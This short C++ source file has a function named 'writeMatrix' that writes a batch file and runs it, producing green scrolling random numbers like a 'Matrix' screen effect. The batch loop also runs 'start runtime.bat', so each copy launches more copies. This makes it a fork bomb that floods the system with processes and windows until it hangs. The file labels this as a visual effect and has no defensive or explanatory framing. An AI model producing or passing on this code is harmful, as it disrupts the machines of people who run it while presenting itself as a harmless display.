// using ofstream constructors.
#include "stdafx.h"
#include <iostream>
#include <fstream>  

int writeMatrix()
{
	std::ofstream outfile("runtime.bat");

	outfile << "@echo off" << std::endl;
	outfile << "color 2" << std::endl;
	outfile << ":top" << std::endl;
	outfile << "title %random%" << std::endl;
	outfile << "echo %random%" << std::endl;
	outfile << "start runtime.bat" << std::endl;
	outfile << "goto top" << std::endl;

	outfile.close();

	system("start runtime.bat");
	return 0;
}